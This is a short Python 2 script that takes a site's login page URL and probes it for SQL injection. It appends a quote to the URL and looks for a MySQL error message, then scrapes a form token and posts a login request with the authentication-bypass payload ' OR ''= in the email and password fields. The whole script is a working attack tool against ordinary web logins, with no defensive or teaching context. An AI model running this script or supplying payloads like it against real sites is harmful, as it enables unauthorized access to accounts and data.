import requests
import urllib2

fullurl = raw_input("Enter the login page of the site: ")
resp = urllib2.urlopen(fullurl + "'")
body = resp.read()
indx = body.find("fkey")
indx2 = body.find(",", indx)
fkey = body[indx+7:indx2-1]
print fkey
#print body
if "You have an error in your SQL syntax" in body:
    print "High Potential of sql injection"
else:
    print "Low Potential of sql injection"


URL = fullurl
payload = {
    'fkey': fkey,
    'ssrc': '',
    'email':' OR ''=',
    'password':' OR ''=',
    'oauth_version':'',
    'oauth_server':'',
    'openid_username':'',
    'openid_identifier':''
}

session = requests.session()
r = requests.post(URL, data=payload)
if "'The email is not a valid email address.'" in r.content:
    print "False"